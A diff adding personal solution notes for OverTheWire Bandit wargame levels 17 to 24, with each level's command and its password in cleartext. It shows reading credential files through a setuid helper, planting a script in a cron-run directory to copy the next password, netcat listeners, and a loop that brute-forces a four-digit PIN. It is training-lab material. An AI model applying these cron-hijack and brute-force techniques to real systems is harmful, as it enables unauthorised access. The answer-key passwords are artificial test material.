@@ -68,3 +68,44 @@ nmap -sV -p 31000-32000 localhost
 	the scan would took a while
 echo 'JQttfApK4SeyHwDlI9SXGR50qclOAil1' | openssl s_client -connect localhost:<port without echo> -ign_eof
 ssh bandit17@bandit.labs.overthewire.org -p 2220 -i <bandit17 private RSA key>
+
+level 17
+diff -u passwords.new passwords.old
+hga5tuuCLF6fFzUpnagiMN8ssu9LFrdg
+
+level 18
+ssh bandit18@bandit.labs.overthewire.org -p 2220 cat readme
+awhqfNnAbc1naukrpqDYcF95h7HoMTrC
+
+level 19
+./bandit20-do cat /etc/bandit_pass/bandit20
+VxCazJaVykI6W36BkBU0mJTCM8rR95XT
+
+level 20
+echo 'VxCazJaVykI6W36BkBU0mJTCM8rR95XT' | nc -l localhost <your port> &
+./suconnect <your port>
+NvEJF7oVjkddltPSrdKEFOllh9V1IBcq
+
+level 21
+look inside /etc/cron.d/ for the next level passowrds
+WdDozAdTM2z9DiFEQ2mGlwngMfj4EZff
+
+level 22
+use the script you found in cronjob, use bandit23
+QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
+
+level 23
+check what the script is doing from cronjob
+mkdir /tmp/<something>
+nano <your script.sh>
+touch <temp file>
+	#!/bin/bash
+	cat /etc/bandit_pass/bandit24 > /tmp/<something>/<temp file>
+chmod 777 <your script.sh>
+cp <your script.sh> <location from the cronjob>
+VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
+
+level 24
+for i in {0000..9999}; do echo "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar $i"; done > var
+cat var | nc localhosts 30002 > answer
+cat answer | grep -v Wrong
